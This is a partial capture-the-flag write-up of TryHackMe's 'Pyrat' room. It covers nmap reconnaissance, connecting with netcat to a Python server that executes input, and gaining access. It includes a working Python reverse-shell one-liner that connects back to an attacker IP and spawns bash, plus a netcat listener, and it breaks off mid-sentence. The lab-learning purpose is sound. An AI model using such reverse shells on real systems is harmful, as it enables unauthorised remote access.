---
title: Pyrat writeup
difficulty: Easy
author: 0xray1e
date: 2026-02-26T15:52:00.000+03:00
description: A walkthrough of TryHackMe's boot-to-root Pyrat room.
categories:
  - Boot to Root
  - TryHackMe
tags: []
---
## Room Description

[Pyrat room](https://tryhackme.com/room/pyrat)

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

## Recon

First, I started with an nmap scan.

`nmap -Pn -T4 10.67.166.0`

![](/assets/img/uploads/Pasted image 20260221151604.png "TCP ports nmap scan")

This returned port 22 used for ssh and port 8000 for HTTP. I ran a script on the http port to get more information on what was running there.

`nmap -sC -sV -p8000 10.67.166.0`

![port 8000 nmap scan](/assets/img/uploads/Pasted image 20260221151729.png "port 8000 nmap scan")

The above response showed that this is a Python server. I started a netcat connection to access the server.

`nc 10.67.175.146 8000`

## Initial Acess

Trying to do directory listing did not help, but after some exploring, I realised that the server can process Python commands.

![python command](/assets/img/uploads/Pasted image 20260221174142.png "python command")

Using this, I spawned a python-based reverse shell.

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.141.57",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")`

Listened on port 4444 on my machine.

`nc -nvlp 4444`

After gaining access asxxx
